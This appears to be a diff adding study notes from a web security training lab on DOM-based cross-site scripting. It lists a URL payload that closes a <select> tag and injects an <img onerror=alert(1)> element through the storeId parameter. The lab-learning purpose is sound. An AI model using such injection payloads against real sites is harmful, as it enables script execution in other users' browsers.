@@ -1,0 +1,8 @@
+// Search product page's JavaScript code for "location.search"
+// Discover that actually product page can take 1 more parameter which is storeId, besides productId
+// If storeId is specified, it will write to a <option> tag inside <select>
+// Payloads used:
+https://ac911fb91fff0ba4809d3084002100d4.web-security-academy.net/product?productId=18&storeId=Milan
+https://ac911fb91fff0ba4809d3084002100d4.web-security-academy.net/product?productId=18&storeId=</select><img src=1 onerror=alert(1)>
+
+// This is an example of cannot simply search DOM for source input
